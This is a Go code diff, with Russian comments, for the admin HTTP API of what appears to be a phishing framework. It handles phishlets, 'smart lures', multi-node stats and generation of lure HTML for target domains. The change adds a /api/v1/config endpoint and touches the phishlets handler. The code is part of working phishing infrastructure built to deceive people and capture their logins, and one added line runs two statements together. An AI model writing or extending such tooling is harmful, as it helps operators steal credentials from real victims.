@@ -32,7 +32,8 @@ type Deps struct {
 	Limit       Limiter
 	OnSmart     func(in SmartLureIn) // персист smart-lure (main wires sqlite)
 	NodeID      string               // node_id в stats (мульти-нода)
-	PhishDir    string               // dir для reload/persist YAML (hot-reload)
+	Config      func() map[string]any
+	PhishDir    string // dir для reload/persist YAML (hot-reload)
 	OnReload    func() error         // Reload стора (main wires store.Reload)
 	OnUpsert    func(yaml []byte) (string, error)
 	OnGenerate  func(origin, domain, id, sub, html string) (string, error)
@@ -82,8 +83,17 @@ func Handler(d Deps) http.Handler {
 			"uptime_s":  int(time.Since(d.StartedAt).Seconds()),
 		})
 	}))
-	mux.HandleFunc("/api/v1/phishlets", guard(func(w http.ResponseWriter, r *http.Request) {
-		switch r.Method {
+	// Конфиг сервера для меню (БЕЗ секретов: токены/ключи не отдаем).
+	mux.HandleFunc("/api/v1/config", guard(func(w http.ResponseWriter, _ *http.Request) {
+		cfg := map[string]any{"node": d.NodeID}
+		if d.Config != nil {
+			for k, v := range d.Config() {
+				cfg[k] = v
+			}
+		}
+		_ = json.NewEncoder(w).Encode(cfg)
+	}))
+	mux.HandleFunc("/api/v1/phishlets", guard(func(w http.ResponseWriter, r *http.Request) {		switch r.Method {
 		case http.MethodGet:
 			ids := []string{}
 			for _, p := range d.Store.All() {
